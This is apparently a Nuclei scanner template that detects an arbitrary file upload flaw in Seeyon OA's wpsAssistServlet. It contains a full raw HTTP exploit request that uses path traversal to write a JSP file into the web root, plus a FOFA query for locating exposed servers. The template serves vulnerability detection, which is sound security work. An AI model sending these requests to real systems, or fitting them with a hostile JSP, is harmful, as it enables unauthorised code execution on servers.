http:
- matchers:
  - part: body_1
    type: word
    words:
    - '"success":'
  - part: body_2
    type: word
    words:
    - '{{string}}'
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/{{filename}}.jsp&fileId=2
    HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b

    Accept-Encoding: gzip


    --59229605f98b8cf290a7b8908b34616b

    Content-Disposition: form-data; name="upload"; filename="{{filename}}.xls"

    Content-Type: application/vnd.ms-excel


    <% out.println("{{string}}");%>

    --59229605f98b8cf290a7b8908b34616b--

    '
  - 'GET /{{filename}}.jsp HTTP/1.1

    Host: {{Hostname}}

    '
id: seeyon-oa-sp2-file-upload
info:
  author: SleepingBag945
  description: 'There is an arbitrary file upload vulnerability in the Seeyon OA wpsAssistServlet
    interface. Through the vulnerability, an attacker can send a specific request
    packet to upload malicious files and obtain server permissions.

    '
  metadata:
    fofa-query: "app=\"\u81F4\u8FDC\u4E92\u8054-OA\" && title=\"V8.0SP2\""
    max-request: 2
    verified: true
  name: Seeyon OA wpsAssistServlet - Arbitrary File Upload
  reference:
  - https://github.com/achuna33/MYExploit/blob/8ffbf7ee60cbd77ad90b0831b93846aba224ab29/src/main/java/com/achuna33/Controllers/SeeyonController.java
  - "http://wiki.peiqi.tech/wiki/oa/\u81F4\u8FDCOA/\u81F4\u8FDCOA%20wpsAssistServlet%20\u4EFB\
    \u610F\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E.html"
  - https://github.com/Threekiii/Awesome-POC/blob/master/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA%20wpsAssistServlet%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
  severity: critical
  tags: seeyon,oa,file-upload,intrusive,vuln
variables:
  filename: '{{rand_base(6)}}'
  string: '{{rand_base(5)}}'
